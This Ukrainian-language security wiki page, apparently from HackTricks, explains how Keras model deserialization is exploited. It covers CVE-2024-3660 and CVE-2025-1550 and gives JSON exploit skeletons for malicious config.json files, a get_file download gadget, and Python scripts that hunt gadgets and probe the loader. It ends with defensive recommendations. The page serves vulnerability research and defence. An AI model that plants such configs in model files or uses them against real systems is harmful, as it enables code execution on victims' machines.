# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

Ця сторінка підсумовує практичні техніки експлуатації проти конвеєра десеріалізації моделей Keras, пояснює внутрішню структуру формату .keras та поверхню атаки, а також надає набір інструментів для дослідників для знаходження вразливостей файлів моделей (MFVs) та гаджетів після виправлення.

## Внутрішня структура формату .keras

Файл .keras є ZIP-архівом, що містить принаймні:
- metadata.json – загальна інформація (наприклад, версія Keras)
- config.json – архітектура моделі (основна поверхня атаки)
- model.weights.h5 – ваги в HDF5

Файл config.json керує рекурсивною десеріалізацією: Keras імпортує модулі, вирішує класи/функції та реконструює шари/об'єкти з словників, контрольованих атакуючим.

Приклад фрагмента для об'єкта шару Dense:
```json
{
"module": "keras.layers",
"class_name": "Dense",
"config": {
"units": 64,
"activation": {
"module": "keras.activations",
"class_name": "relu"
},
"kernel_initializer": {
"module": "keras.initializers",
"class_name": "GlorotUniform"
}
}
}
```
Десеріалізація виконує:
- Імпорт модулів та розв'язання символів з ключів module/class_name
- виклик from_config(...) або конструктора з аргументами kwargs, контрольованими атакуючим
- Рекурсія в вкладені об'єкти (активації, ініціалізатори, обмеження тощо)

Історично це відкривало три примітиви для атакуючого, що створює config.json:
- Контроль над тим, які модулі імпортуються
- Контроль над тим, які класи/функції розв'язуються
- Контроль над аргументами kwargs, переданими в конструктори/from_config

## CVE-2024-3660 – RCE байт-коду Lambda-слою

Корінна причина:
- Lambda.from_config() використовував python_utils.func_load(...), який декодує base64 та викликає marshal.loads() на байтах атакуючого; десеріалізація Python може виконувати код.

Ідея експлуатації (спрощене навантаження в config.json):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "exploit_lambda",
"function": {
"function_type": "lambda",
"bytecode_b64": "<attacker_base64_marshal_payload>"
}
}
}
```
Зменшення ризиків:
- Keras за замовчуванням використовує safe_mode=True. Серіалізовані Python-функції в Lambda заблоковані, якщо користувач явно не відмовляється від цього, встановивши safe_mode=False.

Примітки:
- Спадкові формати (старі HDF5 збереження) або старі кодові бази можуть не виконувати сучасні перевірки, тому атаки в стилі "пониження" все ще можуть застосовуватися, коли жертви використовують старі завантажувачі.

## CVE-2025-1550 – Довільний імпорт модуля в Keras ≤ 3.8

Корінна причина:
- _retrieve_class_or_fn використовував необмежений importlib.import_module() з рядками модуля, контрольованими атакуючими, з config.json.
- Вплив: Довільний імпорт будь-якого встановленого модуля (або модуля, закладеного атакуючим на sys.path). Код виконується під час імпорту, після чого відбувається створення об'єкта з аргументами kwargs атакуючого.

Ідея експлуатації:
```json
{
"module": "maliciouspkg",
"class_name": "Danger",
"config": {"arg": "val"}
}
```
Покращення безпеки (Keras ≥ 3.9):
- Список дозволених модулів: імпорти обмежені офіційними модулями екосистеми: keras, keras_hub, keras_cv, keras_nlp
- Режим безпеки за замовчуванням: safe_mode=True блокує небезпечне завантаження серіалізованих функцій Lambda
- Основна перевірка типів: десеріалізовані об'єкти повинні відповідати очікуваним типам

## Поверхня гаджетів після виправлення всередині списку дозволених

Навіть з дозволеним списком і режимом безпеки, залишається широка поверхня серед дозволених викликів Keras. Наприклад, keras.utils.get_file може завантажувати довільні URL-адреси в місця, вибрані користувачем.

Гаджет через Lambda, який посилається на дозволену функцію (не серіалізований байт-код Python):
```json
{
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "dl",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {
"fname": "artifact.bin",
"origin": "https://example.com/artifact.bin",
"cache_dir": "/tmp/keras-cache"
}
}
}
```
Важливе обмеження:
- Lambda.call() додає вхідний тензор як перший позиційний аргумент під час виклику цільового викликаного об'єкта. Вибрані гаджети повинні терпіти додатковий позиційний аргумент (або приймати *args/**kwargs). Це обмежує, які функції є життєздатними.

Потенційні наслідки дозволених гаджетів:
- Довільне завантаження/запис (посадка шляхів, отруєння конфігурацій)
- Мережеві зворотні виклики/ефекти, подібні до SSRF, в залежності від середовища
- Ланцюгування до виконання коду, якщо записані шляхи пізніше імпортуються/виконуються або додаються до PYTHONPATH, або якщо існує місце для запису з виконанням при запису

## Інструменти дослідника

1) Систематичне виявлення гаджетів у дозволених модулях

Перелічте кандидатні викликані об'єкти в keras, keras_nlp, keras_cv, keras_hub і пріоритезуйте ті, що мають побічні ефекти з файлами/мережею/процесами/середовищем.
```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
if not hasattr(mod, "__path__"):
return
for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
yield m.name

candidates = []
for root in ALLOWLIST:
try:
r = importlib.import_module(root)
except Exception:
continue
for name in iter_modules(r):
if name in seen:
continue
seen.add(name)
try:
m = importlib.import_module(name)
except Exception:
continue
for n, obj in inspect.getmembers(m):
if inspect.isfunction(obj) or inspect.isclass(obj):
sig = None
try:
sig = str(inspect.signature(obj))
except Exception:
pass
doc = (inspect.getdoc(obj) or "").lower()
text = f"{name}.{n} {sig} :: {doc}"
# Heuristics: look for I/O or network-ish hints
if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```
2) Пряме тестування десеріалізації (не потрібен архів .keras)

Введіть підготовлені словники безпосередньо в десеріалізатори Keras, щоб дізнатися прийняті параметри та спостерігати за побічними ефектами.
```python
from keras import layers

cfg = {
"module": "keras.layers",
"class_name": "Lambda",
"config": {
"name": "probe",
"function": {"module": "keras.utils", "class_name": "get_file"},
"arguments": {"fname": "x", "origin": "https://example.com/x"}
}
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```
3) Перехресне тестування версій та формати

Keras існує в кількох кодових базах/епохах з різними обмеженнями та форматами:
- Вбудований Keras TensorFlow: tensorflow/python/keras (старий, запланований до видалення)
- tf-keras: підтримується окремо
- Multi-backend Keras 3 (офіційний): введено нативний .keras

Повторюйте тести в різних кодових базах та форматах (.keras проти старого HDF5), щоб виявити регресії або відсутні обмеження.

## Рекомендації щодо захисту

- Ставтеся до файлів моделей як до ненадійного вводу. Завантажуйте моделі лише з надійних джерел.
- Тримайте Keras в актуальному стані; використовуйте Keras ≥ 3.9, щоб скористатися перевагами дозволів та перевірок типів.
- Не встановлюйте safe_mode=False при завантаженні моделей, якщо ви не повністю довіряєте файлу.
- Розгляньте можливість виконання десеріалізації в ізольованому середовищі з найменшими привілеями без виходу в мережу та з обмеженим доступом до файлової системи.
- Застосовуйте дозволи/підписи для джерел моделей та перевірки цілісності, де це можливо.

## Посилання

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)

{{#include ../../banners/hacktricks-training.md}}
